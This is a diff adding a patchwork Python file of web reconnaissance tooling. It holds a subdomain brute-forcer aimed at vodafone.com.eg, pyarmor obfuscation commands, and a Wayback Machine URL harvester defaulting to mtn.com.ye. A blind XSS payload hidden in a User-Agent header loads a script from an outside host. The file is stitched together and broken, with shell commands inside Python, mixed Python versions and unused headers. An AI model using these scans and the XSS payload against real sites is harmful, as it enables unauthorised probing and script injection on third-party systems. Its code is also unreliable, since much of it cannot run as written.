@@ -1,0 +1,91 @@
+#!/usr/bin/python2.7
+#discover hidden directory by bruteforceing common directory name 
+#if we get a respond then their is a directory then we also get the recursive of the directory.
+import concurrent.futures
+
+import requests,os
+
+def request(url):
+	try:
+		return requests.get("http://" + url,verify=False, timeout=1)
+	#except requests.exceptions.ConnectionError:
+	except Exception as f:		
+		pass
+
+print(os.listdir(os.getcwd()))
+files=raw_input("put your files :")
+def dirdiscover(url):
+	with open(files,"r") as wordlist_file:
+		for line in wordlist_file:
+			word = line.strip()
+			test_url = word+"."+url 
+			print(test_url)
+			response = request(test_url)
+			if response :
+				print "[+] Discovered URL ----> " + test_url
+				with open ("active_bugs","aw") as f:
+					f.write(test_url+"\r\n")
+
+url="vodafone.com.eg"
+dirdiscover(url)
+#edit the url you want to scan
+#with concurrent.futures.ThreadPoolExecutor() as executor:
+	#executor( dirdiscover(url))
+
+           
+#recursively gothrough each and every path		
+
+
+
+pip install pyinstaller
+
+
+pyarmor obfuscate testing.py
+pyarmor pack testing.py
+
+
+pyarmor -d obfuscate --recurisve
+
+
+from collections import OrderedDict
+import requests,json
+
+
+host=input("pls put your regex site :") or "mtn.com.ye"
+
+url='http://web.archive.org/cdx/search/cdx?url=*.{0}%2F*&output=json&fl=original&collapse=urlkey'.format(host)
+
+
+try:
+	#
+	req=requests.get(url)
+	data=req.json()
+
+	my_list= []
+
+	for i in data :
+		for x in i:
+			 my_list.append(x)
+
+
+
+
+	end_list=list(OrderedDict.fromkeys(my_list).keys())
+
+	with open ("archive.txt","a") as vi:
+		for s in end_list:
+			print(s)
+			print(s,file=vi)
+			
+except Exception as error:
+	print(error)
+
+	#cat vf | grep ] | cut -d "]" -f1 | cut -d "[" -f2 | cut -d "\"" -f2 | tee vodafone
+try:
+	headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko "><script src=https://spxssht.xss.ht></script>) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.125'} 
+
+	req = requests.get(url=s, )
+
+
+except:
+	pass
